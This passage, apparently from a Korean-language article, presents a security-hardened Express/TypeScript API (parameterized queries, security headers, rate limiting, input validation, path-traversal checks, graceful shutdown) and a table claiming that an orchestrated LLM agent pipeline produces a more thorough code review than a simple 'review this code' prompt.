  connectionLimit: env.DB_CONNECTION_LIMIT,
  queueLimit: 0,
  // 보안 강화 옵션
  multipleStatements: false,  // 다중 쿼리 실행 금지 (SQLi 2차 방어)
  charset: 'utf8mb4',
});

export async function query<T extends RowDataPacket[]>(
  sql: string,
  params?: unknown[],
): Promise<T> {
  const [rows] = await pool.execute<T>(sql, params);
  return rows;
}

export async function healthCheck(): Promise<boolean> {
  try {
    const connection: PoolConnection = await pool.getConnection();
    await connection.ping();
    connection.release();
    return true;
  } catch {
    return false;
  }
}

export async function closePool(): Promise<void> {
  await pool.end();
  logger.info('Database connection pool closed');
}

export default pool;
```

#### `src/middleware/security.ts` — 보안 미들웨어 (CWE-693 방어)

```typescript
import helmet from 'helmet';
import cors from 'cors';
import rateLimit from 'express-rate-limit';
import { Express } from 'express';
import { env } from '../config/env';

export function applySecurityMiddleware(app: Express): void {
  // 1. Helmet — 보안 헤더 자동 설정
  //    X-Content-Type-Options, X-Frame-Options, CSP, HSTS 등
  app.use(helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", 'data:'],
        connectSrc: ["'self'"],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        frameSrc: ["'none'"],
      },
    },
    crossOriginEmbedderPolicy: true,
    crossOriginOpenerPolicy: true,
    crossOriginResourcePolicy: { policy: 'same-origin' },
    referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  }));

  // 2. CORS — 허용된 Origin만 접근 가능
  app.use(cors({
    origin: env.CORS_ORIGIN.split(','),
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization'],
    credentials: true,
    maxAge: 86400,
  }));

  // 3. Rate Limiting — DoS/Brute-force 방어 (CWE-770)
  app.use(rateLimit({
    windowMs: env.RATE_LIMIT_WINDOW_MS,
    max: env.RATE_LIMIT_MAX,
    standardHeaders: true,
    legacyHeaders: false,
    message: { error: 'Too many requests, please try again later' },
    keyGenerator: (req) => {
      return req.ip || req.socket.remoteAddress || 'unknown';
    },
  }));

  // 4. 요청 본문 크기 제한
  app.use(require('express').json({ limit: '10kb' }));
  app.use(require('express').urlencoded({ extended: false, limit: '10kb' }));

  // 5. X-Powered-By 제거 (정보 노출 방지)
  app.disable('x-powered-by');
}
```

#### `src/middleware/errorHandler.ts` — 전역 에러 핸들러 (CWE-209 방어)

```typescript
import { Request, Response, NextFunction } from 'express';
import { ZodError } from 'zod';
import { logger } from '../utils/logger';
import { env } from '../config/env';

// 애플리케이션 커스텀 에러
export class AppError extends Error {
  constructor(
    public readonly statusCode: number,
    message: string,
    public readonly isOperational: boolean = true,
  ) {
    super(message);
    this.name = 'AppError';
  }
}

// 전역 에러 핸들러 — 민감 정보 노출 방지
export function globalErrorHandler(
  err: Error,
  req: Request,
  res: Response,
  _next: NextFunction,
): void {
  // 서버 측 로깅 — 전체 에러 정보 기록 (모니터링용)
  logger.error('Unhandled error', {
    error: logger.sanitizeError(err),
    method: req.method,
    path: req.path,
    ip: req.ip,
    userAgent: req.get('user-agent'),
  });

  // Zod 검증 에러
  if (err instanceof ZodError) {
    res.status(400).json({
      error: 'Validation failed',
      details: err.errors.map((e) => ({
        field: e.path.join('.'),
        message: e.message,
      })),
    });
    return;
  }

  // 애플리케이션 에러 (의도된 에러)
  if (err instanceof AppError) {
    res.status(err.statusCode).json({
      error: err.message,
    });
    return;
  }

  // 알 수 없는 에러 — 클라이언트에 상세 정보 절대 노출하지 않음
  res.status(500).json({
    error: 'Internal server error',
    // 개발 환경에서만 상세 정보 포함
    ...(env.NODE_ENV === 'development' && {
      debug: { message: err.message, stack: err.stack },
    }),
  });
}

// 404 핸들러
export function notFoundHandler(req: Request, res: Response): void {
  res.status(404).json({
    error: 'Resource not found',
    path: req.path,
  });
}
```

#### `src/middleware/validator.ts` — 입력 검증 미들웨어

```typescript
import { z, ZodSchema } from 'zod';
import { Request, Response, NextFunction } from 'express';

// 제네릭 검증 미들웨어 팩토리 (OCP — 새 스키마 추가 시 기존 코드 수정 불필요)
export function validateQuery<T extends ZodSchema>(schema: T) {
  return (req: Request, res: Response, next: NextFunction): void => {
    const result = schema.safeParse(req.query);
    if (!result.success) {
      res.status(400).json({
        error: 'Invalid query parameters',
        details: result.error.errors.map((e) => ({
          field: e.path.join('.'),
          message: e.message,
        })),
      });
      return;
    }
    // 검증된 데이터를 req에 바인딩
    (req as any).validatedQuery = result.data;
    next();
  };
}

// 각 엔드포인트의 입력 스키마 정의
export const userSearchSchema = z.object({
  name: z.string()
    .min(1, 'Name is required')
    .max(100, 'Name must be 100 characters or less')
    .regex(/^[a-zA-Z가-힣0-9\s\-_.]+$/, 'Name contains invalid characters'),
});

export const searchQuerySchema = z.object({
  q: z.string()
    .min(1, 'Search query is required')
    .max(200, 'Search query must be 200 characters or less'),
});

export const fileQuerySchema = z.object({
  name: z.string()
    .min(1, 'Filename is required')
    .max(255, 'Filename too long')
    .regex(/^[a-zA-Z0-9_\-]+\.[a-zA-Z0-9]+$/, 'Invalid filename format'),
});

export type UserSearchQuery = z.infer<typeof userSearchSchema>;
export type SearchQuery = z.infer<typeof searchQuerySchema>;
export type FileQuery = z.infer<typeof fileQuerySchema>;
```

#### `src/routes/users.ts` — Users 라우트 (CWE-89 방어)

```typescript
import { Router, Request, Response, NextFunction } from 'express';
import { query } from '../database/pool';
import { validateQuery, userSearchSchema, UserSearchQuery } from '../middleware/validator';
import { RowDataPacket } from 'mysql2/promise';
import { logger } from '../utils/logger';

const router = Router();

interface UserRow extends RowDataPacket {
  id: number;
  name: string;
  email: string;
}

// GET /users?name=...
router.get(
  '/',
  validateQuery(userSearchSchema),
  async (req: Request, res: Response, next: NextFunction): Promise<void> => {
    try {
      const { name } = (req as any).validatedQuery as UserSearchQuery;

      // ✅ Parameterized Query — SQL Injection 완전 방어
      // ✅ SELECT *가 아닌 필요한 컬럼만 지정 — 과도한 데이터 노출 방지
      const users = await query<UserRow[]>(
        'SELECT id, name, email FROM users WHERE name = ?',
        [name],
      );

      logger.debug('User search completed', {
        query: name,
        resultCount: users.length,
      });

      res.json({
        data: users,
        count: users.length,
      });
    } catch (error) {
      next(error); // 전역 에러 핸들러로 위임
    }
  },
);

export default router;
```

#### `src/routes/search.ts` — Search 라우트 (CWE-79 방어)

```typescript
import { Router, Request, Response, NextFunction } from 'express';
import { validateQuery, searchQuerySchema, SearchQuery } from '../middleware/validator';

const router = Router();

// GET /search?q=...
router.get(
  '/',
  validateQuery(searchQuerySchema),
  async (req: Request, res: Response, _next: NextFunction): Promise<void> => {
    const { q } = (req as any).validatedQuery as SearchQuery;

    // ✅ JSON API로 응답 — XSS 근본적 차단
    // HTML에 사용자 입력을 직접 삽입하지 않음
    // Content-Type: application/json은 브라우저가 HTML로 해석하지 않음
    res.json({
      query: q,
      results: [],
      message: `검색 결과: ${q}`,
    });
  },
);

export default router;
```

#### `src/routes/files.ts` — Files 라우트 (CWE-22 방어)

```typescript
import { Router, Request, Response, NextFunction } from 'express';
import path from 'path';
import fs from 'fs/promises';
import { validateQuery, fileQuerySchema, FileQuery } from '../middleware/validator';
import { env } from '../config/env';
import { AppError } from '../middleware/errorHandler';
import { logger } from '../utils/logger';

const router = Router();

// 허용된 파일 확장자 화이트리스트 (Defense in Depth)
const ALLOWED_EXTENSIONS = new Set(['.jpg', '.jpeg', '.png', '.gif', '.pdf', '.txt']);

// 업로드 디렉토리 절대경로 (한 번만 계산)
const UPLOADS_DIR = path.resolve(process.cwd(), env.UPLOADS_DIR);

// GET /file?name=...
router.get(
  '/',
  validateQuery(fileQuerySchema),
  async (req: Request, res: Response, next: NextFunction): Promise<void> => {
    try {
      const { name: filename } = (req as any).validatedQuery as FileQuery;

      // Layer 1: 확장자 검증 (화이트리스트)
      const ext = path.extname(filename).toLowerCase();
      if (!ALLOWED_EXTENSIONS.has(ext)) {
        throw new AppError(400, `File type '${ext}' is not allowed`);
      }

      // Layer 2: 경로 순회 방어 — 정규화된 경로가 업로드 디렉토리 내에 있는지 확인
      const resolvedPath = path.resolve(UPLOADS_DIR, filename);
      if (!resolvedPath.startsWith(UPLOADS_DIR + path.sep)) {
        logger.warn('Path traversal attempt detected', {
          filename,
          resolvedPath,
          ip: req.ip,
        });
        throw new AppError(403, 'Access denied');
      }

      // Layer 3: 파일 존재 여부 확인
      try {
        await fs.access(resolvedPath);
      } catch {
        throw new AppError(404, 'File not found');
      }

      // Layer 4: root 옵션으로 안전하게 전송
      res.sendFile(filename, {
        root: UPLOADS_DIR,
        dotfiles: 'deny',      // 숨김 파일 접근 차단
        headers: {
          'X-Content-Type-Options': 'nosniff',
          'Content-Disposition': 'attachment', // 강제 다운로드
        },
      });
    } catch (error) {
      next(error);
    }
  },
);

export default router;
```

#### `src/index.ts` — 앱 진입점 (12-Factor: Port Binding, Disposability)

```typescript
import express from 'express';
import { env } from './config/env';
import { logger } from './utils/logger';
import { applySecurityMiddleware } from './middleware/security';
import { globalErrorHandler, notFoundHandler } from './middleware/errorHandler';
import { healthCheck, closePool } from './database/pool';
import userRoutes from './routes/users';
import searchRoutes from './routes/search';
import fileRoutes from './routes/files';

const app = express();

// ──── 보안 미들웨어 적용 ────
applySecurityMiddleware(app);

// ──── 헬스 체크 (12-Factor: Disposability) ────
app.get('/health', async (_req, res) => {
  const dbHealthy = await healthCheck();
  const status = dbHealthy ? 200 : 503;
  res.status(status).json({
    status: dbHealthy ? 'healthy' : 'unhealthy',
    timestamp: new Date().toISOString(),
    checks: {
      database: dbHealthy ? 'connected' : 'disconnected',
    },
  });
});

// ──── 라우트 등록 ────
app.use('/users', userRoutes);
app.use('/search', searchRoutes);
app.use('/file', fileRoutes);

// ──── 404 + 전역 에러 핸들러 (반드시 라우트 이후) ────
app.use(notFoundHandler);
app.use(globalErrorHandler);

// ──── 서버 시작 ────
const server = app.listen(env.PORT, () => {
  logger.info('Server started', {
    port: env.PORT,
    environment: env.NODE_ENV,
  });
});

// ──── Graceful Shutdown (12-Factor: Factor IX — Disposability) ────
function gracefulShutdown(signal: string): void {
  logger.info(`${signal} received, starting graceful shutdown`);

  server.close(async () => {
    logger.info('HTTP server closed');

    try {
      await closePool();
      logger.info('All connections closed, exiting');
      process.exit(0);
    } catch (error) {
      logger.error('Error during shutdown', {
        error: logger.sanitizeError(error),
      });
      process.exit(1);
    }
  });

  // 강제 종료 타이머 (10초 후 강제 종료)
  setTimeout(() => {
    logger.error('Forced shutdown after timeout');
    process.exit(1);
  }, 10_000);
}

process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

// 처리되지 않은 예외/거부 핸들링
process.on('unhandledRejection', (reason) => {
  logger.error('Unhandled rejection', {
    error: logger.sanitizeError(reason),
  });
});

process.on('uncaughtException', (error) => {
  logger.error('Uncaught exception', {
    error: logger.sanitizeError(error),
  });
  process.exit(1);
});

export default app;
```

#### `.env.example` — 환경변수 템플릿

```bash
# Server
NODE_ENV=development
PORT=3000

# Database (CWE-798: 실제 값은 Secret Manager 또는 CI/CD 변수로 주입)
DB_HOST=localhost
DB_PORT=3306
DB_USER=app_readonly
DB_PASSWORD=<SECRET_MANAGER_에서_가져올_것>
DB_NAME=myapp
DB_CONNECTION_LIMIT=10

# Security
CORS_ORIGIN=http://localhost:3000
RATE_LIMIT_WINDOW_MS=900000
RATE_LIMIT_MAX=100

# File uploads
UPLOADS_DIR=./uploads
```

#### `package.json` — 의존성

```json
{
  "name": "secure-express-api",
  "version": "2.0.0",
  "private": true,
  "scripts": {
    "build": "tsc",
    "start": "node dist/index.js",
    "dev": "ts-node-dev --respawn src/index.ts",
    "lint": "eslint src/ --ext .ts",
    "typecheck": "tsc --noEmit"
  },
  "dependencies": {
    "cors": "^2.8.5",
    "dotenv": "^16.4.0",
    "express": "^4.21.0",
    "express-rate-limit": "^7.4.0",
    "helmet": "^8.0.0",
    "mysql2": "^3.11.0",
    "zod": "^3.23.0"
  },
  "devDependencies": {
    "@types/cors": "^2.8.17",
    "@types/express": "^5.0.0",
    "@types/node": "^22.0.0",
    "typescript": "^5.6.0",
    "ts-node-dev": "^2.0.0"
  }
}
```

#### `tsconfig.json`

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "commonjs",
    "lib": ["ES2022"],
    "outDir": "./dist",
    "rootDir": "./src",
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "forceConsistentCasingInFileNames": true,
    "resolveJsonModule": true,
    "declaration": true,
    "declarationMap": true,
    "sourceMap": true,
    "noUnusedLocals": true,
    "noUnusedParameters": true,
    "noImplicitReturns": true,
    "noFallthroughCasesInSwitch": true
  },
  "include": ["src/**/*"],
  "exclude": ["node_modules", "dist"]
}
```

---

## 📊 접근법 A vs 접근법 B 비교 요약

### 접근법 A (단순 프롬프트: "이 코드를 리뷰해줘")가 놓치는 것들

| # | 분석 항목 | 접근법 A (단순) | 접근법 B (오케스트레이션) |
|---|----------|:-:|:-:|
| 1 | SQL Injection 식별 | ✅ 언급 | ✅ CWE-89, CVSS 10.0, 5단계 공격 시나리오 |
| 2 | XSS 식별 | ✅ 언급 | ✅ CWE-79, CVSS 8.2, 4가지 공격 벡터 |
| 3 | Path Traversal 식별 | ⚠️ 간단히 언급 | ✅ CWE-22, CVSS 7.5, 인코딩 우회 포함 5가지 공격 |
| 4 | Hardcoded Credentials | ⚠️ 간단히 언급 | ✅ CWE-798, CVSS 10.0, 연쇄 공격 시나리오 |
| 5 | CVSS 점수 산출 | ❌ 없음 | ✅ 벡터 스트링 포함 상세 산출 |
| 6 | CWE 번호 매핑 | ❌ 없음 | ✅ 전체 8개 CWE 매핑 |
| 7 | OWASP Top 10 분류 | ❌ 없음 | ✅ A01~A09 분류 |
| 8 | 구체적 공격 시나리오 | ❌ 없음 | ✅ 취약점별 다단계 공격 시나리오 |
| 9 | 기술 비교 분석 (mysql vs mysql2 vs Prisma) | ❌ 없음 | ✅ 10개 기준 비교표 |
| 10 | Callback vs Async/Await 비교 | ❌ 없음 | ✅ 5개 측면 비교 |
| 11 | Technology Radar 분류 | ❌ 없음 | ✅ ADOPT/TRIAL/ASSESS/HOLD 4단계 |
| 12 | ADR/RFC 형식 의사결정 기록 | ❌ 없음 | ✅ 영향 분석 + 리스크 완화 전략 |
| 13 | C4 Model 아키텍처 분석 | ❌ 없음 | ✅ Level 1-2 다이어그램 |
| 14 | 보안 헤더 부재 (CWE-693) | ❌ 놓침 | ✅ 6개 헤더 상세 분석 |
| 15 | Rate Limiting 부재 (CWE-770) | ❌ 놓침 | ✅ CVSS 7.5, DoS 시나리오 |
| 16 | SELECT * 과도한 노출 (CWE-200) | ❌ 놓침 | ✅ 노출 데이터 유형 나열 |
| 17 | 에러 정보 노출 (CWE-209) | ❌ 놓침 | ✅ 안전한 에러 응답 구현 |
| 18 | 12-Factor App 적용 | ❌ 없음 | ✅ Config, Logs, Disposability, Port Binding |
| 19 | Clean Code 구조화 | ❌ 단일 파일 수정 | ✅ 모듈화된 프로젝트 구조 |
| 20 | Graceful Shutdown | ❌ 없음 | ✅ SIGTERM/SIGINT 처리 |
| 21 | Health Check 엔드포인트 | ❌ 없음 | ✅ DB 연결 상태 포함 |
| 22 | 입력 검증 체계 (Zod 스키마) | ❌ 없음 | ✅ 타입 안전 검증 미들웨어 |
| 23 | 구조화 로깅 (JSON) | ❌ 없음 | ✅ 레벨별 JSON 로깅 |
| 24 | TypeScript strict 모드 | ❌ 없음 | ✅ 완전한 타입 안전성 |
| 25 | 커넥션 풀링 | ❌ 없음 | ✅ createPool + 설정 |
| 26 | multipleStatements: false 설정 | ❌ 놓침 | ✅ SQLi 2차 방어 |
| 27 | .env.example 템플릿 | ❌ 없음 | ✅ 팀 온보딩 지원 |
| 28 | 의존성 버전 관리 (package.json) | ❌ 없음 | ✅ 최신 안정 버전 지정 |

### 정량 비교

```
┌─────────────────────────────────────────────────────────────────┐
│                     탐지 및 분석 깊이 비교                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  식별된 취약점 수:   접근법 A: 2~3개    접근법 B: 8개            │
│  CWE 매핑:          접근법 A: 0개       접근법 B: 8개            │
│  CVSS 점수 산출:    접근법 A: 0건       접근법 B: 6건            │
│  공격 시나리오:     접근법 A: 0개       접근법 B: 17개           │
│  기술 대안 비교:    접근법 A: 0건       접근법 B: 4건            │
│  코드 모듈 수:      접근법 A: 1개       접근법 B: 10개           │
│  적용 방법론 수:    접근법 A: 0개       접근법 B: 12개           │
│  보안 레이어 수:    접근법 A: 1~2개     접근법 B: 다중 (Defense in Depth) │
│                                                                 │
│  결론: 방법론 학습형 오케스트레이션은 단순 프롬프트 대비          │
│        약 3~5배 더 깊고, 10배 이상 더 포괄적인 분석을 제공       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

> **핵심 교훈**: 단순히 "코드 리뷰해줘"라고 요청하면 LLM은 표면적인 문제만 나열합니다.  
> 그러나 **방법론을 학습시킨 전문 에이전트 파이프라인**을 구성하면,  
> 동일한 LLM이 **보안 전문가 수준의 체계적 분석**을 수행합니다.  
> 이것이 **프롬프트 엔지니어링**과 **에이전트 오케스트레이션**의 힘입니다.
